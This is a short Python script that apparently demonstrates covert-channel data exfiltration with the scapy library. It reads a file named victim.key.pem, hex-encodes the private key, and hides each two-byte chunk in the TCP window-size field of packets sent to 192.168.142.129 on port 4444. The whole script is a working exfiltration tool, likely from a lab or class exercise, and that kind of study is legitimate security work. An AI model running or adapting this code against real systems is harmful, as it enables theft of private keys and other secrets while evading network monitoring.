#!/usr/bin/env python3
from scapy.all import *
from common import *
from time import sleep


if __name__ == "__main__":
    print("Radining in victim private key...")
    with open("victim.key.pem", "r") as f:
        victim_key = f.read()

    print("Serializing data into hex...")
    # Serialize into hex
    hex_string = ser_data(victim_key)

    print("Chunking data into two-byte chunks...")
    # Chunk it into two-byte chunks
    # TCP receive window size field is two bytes in length
    chunks = chunk(hex_string)

    print("Encoding chunks into TCP headers...")
    # Create custom SYN packets
    packets = []
    for chunk in chunks:
        window_size = int(chunk, 16)
        p = IP(dst="192.168.142.129") / TCP(dport=4444, window=window_size)
        packets.append(p)

    print(f"Encoded chunks into {len(packets)} packets! Sending...")
    for p in packets:
        print("!", end="")
        send(p, verbose=False)

    print()
